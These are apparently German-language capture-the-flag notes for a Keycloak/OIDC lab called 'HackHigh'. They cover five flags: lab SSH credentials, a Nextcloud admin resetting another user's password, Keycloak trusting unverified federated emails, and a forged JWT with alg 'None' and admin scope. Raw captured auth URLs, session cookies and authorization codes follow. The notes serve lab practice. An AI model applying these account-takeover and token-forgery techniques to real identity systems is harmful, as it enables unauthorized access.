
## Flagge 1: SSH-Login
Wenn man einen neuen Nutzernamen registriert, und sich bei bookstash einloggt, werden 2 Tipps angezeigt. Einer enthält Zugangsdaten für SSH
User: `university-member`
Pass: `jumpy`
Wenn man sich mit diesen Daten beim angegebenen SSH-Server anmelden gibt es unter flag/flag eine Flagge.

## Flagge 2: NextCloud
Um an die Flagge zu gelangen muss man sich im Cyber Realm den User admin anlegen. Dieser ist dann in Nextcloud ein Administrator. Der admin darf vom User parker das Passwort zurücksetzen. Um an die Daten von parker zu kommen , kann man `rclone` nutzen. In einem Bild ist eine Flag versteckt (`strings` hilft).

## Flagge 3: Legacy
Man muss einen Account im Realm Cyber erstellen und sich mit diesem Anmelden. Obwohl die E-Mail im Realm Cyber als not verified gilt, werden in der Standardeinstellung von keycloak E-Mails aus anderen Realms als trusted angesehen.

```
Do you know what really happened?

... your profile created via the realm HackHigh does not have a verified mail address, but when logging in via Identity Federation (Cyber), the mail address provided by this other identity provider is trusted, although the identity provider marks it as not verified. This is (surprisingly) the default config by the way, when configuring new identity providers in Keycloak.

Some hints, just for you

There is a Keycloak user console, reachable via http://keycloak/realms/hackhigh/account
The Keycloak user console is an OIDC app, which makes proper use of the OIDC protocol
```

## Flagge 4: Wenn man die Admin-Console aufruft
Wenn man den Hints aus Flagge 3 folgt bekommt man eine Webapplikation zu sehen und es wird ein 403 Fehler innerhalb dieser angezeigt. Um genauer zu erforschen, was es mit diesem Fehler auf sich hat guckt man sich in burp suite die mitgeschriebenen Requests an. Dort ist ein JWT-Token eingebettet welcher, wenn man diesen decodiert die nächste Flag enthält.

## Flagge 5: 

```
{"alg": "None","typ": "JWT","kid": "QgDdOZFMiBzGjWfP1kEVoH4jUawllyx8PD4L2kY3DiE"}
{"exp": 1679390877,
  "iat": 1679390277,
  "auth_time": 1679390276,
  "jti": "1ddce96b-a604-4a7b-8f6e-c9fb8c64514f",
  "iss": "http://10.65.21.159/realms/hackhigh",
  "sub": "f59e78c8-7e35-43f9-a278-21d96589847b",
  "typ": "Bearer",
  "azp": "security-admin-console",
  "nonce": "825ac9a7-ed2b-420a-8465-263a60c1d094",
  "session_state": "89fb7c49-2104-431b-a1df-91078d4a8e77",
  "acr": "1",
  "scope": "openid profile email roles admin",
  "sid": "89fb7c49-2104-431b-a1df-91078d4a8e77",
  "email_verified": true,
  "name": "admin admin",
  "preferred_username": "admin",
  "given_name": "admin",
  "family_name": "admin",
  "email": "admin@admin.com"
}

eyJhbGciOiAiTm9uZSIsInR5cCI6ICJKV1QiLCJraWQiOiAiUWdEZE9aRk1pQnpHaldmUDFrRVZvSDRqVWF3bGx5eDhQRDRMMmtZM0RpRSJ9.eyJleHAiOiAxNjc5MzkwODc3LAogICJpYXQiOiAxNjc5MzkwMjc3LAogICJhdXRoX3RpbWUiOiAxNjc5MzkwMjc2LAogICJqdGkiOiAiMWRkY2U5NmItYTYwNC00YTdiLThmNmUtYzlmYjhjNjQ1MTRmIiwKICAiaXNzIjogImh0dHA6Ly8xMC42NS4yMS4xNTkvcmVhbG1zL2hhY2toaWdoIiwKICAic3ViIjogImY1OWU3OGM4LTdlMzUtNDNmOS1hMjc4LTIxZDk2NTg5ODQ3YiIsCiAgInR5cCI6ICJCZWFyZXIiLAogICJhenAiOiAic2VjdXJpdHktYWRtaW4tY29uc29sZSIsCiAgIm5vbmNlIjogIjgyNWFjOWE3LWVkMmItNDIwYS04NDY1LTI2M2E2MGMxZDA5NCIsCiAgInNlc3Npb25fc3RhdGUiOiAiODlmYjdjNDktMjEwNC00MzFiLWExZGYtOTEwNzhkNGE4ZTc3IiwKICAiYWNyIjogIjEiLAogICJzY29wZSI6ICJvcGVuaWQgcHJvZmlsZSBlbWFpbCByb2xlcyBhZG1pbiIsCiAgInNpZCI6ICI4OWZiN2M0OS0yMTA0LTQzMWItYTFkZi05MTA3OGQ0YThlNzciLAogICJlbWFpbF92ZXJpZmllZCI6IHRydWUsCiAgIm5hbWUiOiAiYWRtaW4gYWRtaW4iLAogICJwcmVmZXJyZWRfdXNlcm5hbWUiOiAiYWRtaW4iLAogICJnaXZlbl9uYW1lIjogImFkbWluIiwKICAiZmFtaWx5X25hbWUiOiAiYWRtaW4iLAogICJlbWFpbCI6ICJhZG1pbkBhZG1pbi5jb20iCn0=
```

## Wiki

XSRF-TOKEN: 
```
{"iv":"XOhu7yw+jLregl24DJFRRw==","value":"h+o6dhupZLnAjIdUx4PI9cYqbWsCB368I4Z+24Q2ICb+9lbkuxncMevZYtMxikWR6x3PrQ9+ECNRG/neCp1WbOy85RewqS/kyb2YrJnSwjF9sWIG082EhvVyWU/hQtER","mac":"bc4404c25bc75c35c8197d2eb6625e1fa33081194c785e15e42a5d60981a9338","tag":""}7
```

bookstack_session:
```
{"iv":"JdtxwS8wdxNRS1jMj6d51w==","value":"oXopEoFNoKrfIqh8mTPc4pDT2Z3So6SRTqQmJ4rpx/a9ICSUQy6mYKBRX9tMuwXgwqiZs5Yfn96f7uXBfI8lR3N/V+OiRCWznjbcQ6nMqea+Oglgnjc0vRxMMyZ5bCma","mac":"5e09d4ea0aa29c3189645533aaf5fb231055f65d6a775b67560e1bceea828683","tag":""}7
```


AuthURL: http://10.65.41.5/realms/hackhigh/protocol/openid-connect/auth?state=4bd2c3c474126f214f0c59329d9b5c0d&scope=openid%20profile%20email&response_type=code&approval_prompt=auto&redirect_uri=http%3A%2F%2F10.65.8.78%2Foidc%2Fcallback&client_id=bookstack

http://10.65.41.5/realms/hackhigh/login-actions/authenticate?session_code=j7kGdwIsZZ7Nt57niDTQP6Ygly_CwmXivJw4Nk1Z8NI&execution=7ca024fd-940d-41f4-beb4-6688e86a1424&client_id=bookstack&tab_id=nMN5_CCguo0

JWT:
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "510ad449-dd44-4a1e-843a-ebc95aed9579"
}
{
  "cid": "bookstack",
  "pty": "openid-connect",
  "ruri": "http://10.65.8.78/oidc/callback",
  "act": "AUTHENTICATE",
  "notes": {
    "scope": "openid profile email",
    "iss": "http://10.65.41.5/realms/hackhigh",
    "response_type": "code",
    "client_request_param_approval_prompt": "auto",
    "redirect_uri": "http://10.65.8.78/oidc/callback",
    "state": "15fcf9a355079b165972c4d9657a48dc"
  }
}
```



state=4bd2c3c474126f214f0c59329d9b5c0d
scope=openid profile email
response_type=code
approval_prompt=auto
redirect_uri=http://10.65.8.78/oidc/callback
client_id=bookstack

## Cloud - [Authorization Code](https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities/openid-connect#authorization-code-flow-1)
AuthURL: http://10.65.41.5/realms/hackhigh/protocol/openid-connect/auth?response_type=code&redirect_uri=http%3A%2F%2F10.65.55.143%2Fapps%2Foidc_login%2Foidc&client_id=nextcloud&nonce=c59b0aa49e9aa4584ce2bcfa4edc9ea5&state=1fcd1b304669e544174d7808a1b61d2a&scope=openid+profile+openid

response_type=code
redirect_uri=http://10.65.55.143/apps/oidc_login/oidc
client_id=nextcloud
nonce=c59b0aa49e9aa4584ce2bcfa4edc9ea5
state=1fcd1b304669e544174d7808a1b61d2a
scope=openid profile openid

## Legacy [Authorization Code](https://0xn3va.gitbook.io/cheat-sheets/web-application/oauth-2.0-vulnerabilities/openid-connect#authorization-code-flow-1)
AuthURL: http://10.65.41.5/realms/hackhigh/protocol/openid-connect/auth?approval_prompt=force&client_id=k8s-web-guard&nonce=S1nphPkor4UNMW5swAqKQRwxWjtYLZIxy_OoAw3p8XI&redirect_uri=http%3A%2F%2F10.65.53.86%2Foauth2%2Fcallback&response_type=code&scope=openid+email+profile&state=9QqHBqBsulDyRxCJHOGLVjTCWNEhwEFg46tl9RtlAZU%3A%2F

approval_prompt=force
client_id=k8s-web-guard
nonce=S1nphPkor4UNMW5swAqKQRwxWjtYLZIxy_OoAw3p8XI
redirect_uri=http://10.65.53.86/oauth2/callback
response_type=code
scope=openid email profile
state=9QqHBqBsulDyRxCJHOGLVjTCWNEhwEFg46tl9RtlAZU%3A%2F

Callback: http://10.65.53.86/oauth2/callback?state=9QqHBqBsulDyRxCJHOGLVjTCWNEhwEFg46tl9RtlAZU%3A%2F&session_state=da575468-ac78-4fd0-9e9b-5dad979b190e&code=34ac4e25-8087-4a0c-afc9-c2190880c87f.da575468-ac78-4fd0-9e9b-5dad979b190e.67129bda-8180-4536-90d6-42a06843ebc7

state=9QqHBqBsulDyRxCJHOGLVjTCWNEhwEFg46tl9RtlAZU%3A%2F
session_state=da575468-ac78-4fd0-9e9b-5dad979b190e
code=34ac4e25-8087-4a0c-afc9-c2190880c87f.da575468-ac78-4fd0-9e9b-5dad979b190e.67129bda-8180-4536-90d6-42a06843ebc7


## Cyber
http://10.65.40.70/realms/hackhigh/broker/keycloak-oidc/login?
client_id=bookstack&
tab_id=Z3sydU2SRso&
session_code=AvZDFO6qFGwFsB6N4OrMpPUlLb6l2QudH7Xzqyu_0J4